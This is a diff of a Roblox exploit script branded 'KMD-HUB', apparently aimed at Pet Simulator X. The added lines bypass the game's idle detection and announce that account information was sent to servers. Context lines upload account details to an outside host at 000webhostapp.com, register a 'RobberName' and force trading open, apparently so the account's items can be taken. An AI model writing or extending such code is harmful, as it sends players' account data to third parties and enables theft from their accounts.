@@ -1,3 +1,16 @@
+local GC = getconnections or get_signal_cons
+if GC then
+	for i,v in pairs(GC(Players.LocalPlayer.Idled)) do
+		if v["Disable"] then
+			v["Disable"](v)
+		elseif v["Disconnect"] then
+			v["Disconnect"](v)
+		end
+	end
+	print("[KMD-HUB] Loaded r-side.")
+else
+	error("[KMD-HUB] Unsupported exploit. (missing getconnections)")
+end
 -- Info uploader
 local http_request = http_request
 if IsElectron then
@@ -50,6 +63,7 @@ local updateRobberName = http_request_get2("https://kmd-hub.000webhostapp.com/.u
 if updateRobberName ~= "OK" then error("Error updating RobberName in server.") end
 local v2 = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"));
 -- Enable trades
+print("[KMD-HUB-PSX-RSIDE] Sent this account's information to servers!")
 if game:GetService("Players").LocalPlayer.PlayerGui.Settings.Frame.Container.Trading.Toggle.Label.Text ~= "All" then
 	repeat
 	    wait(1)
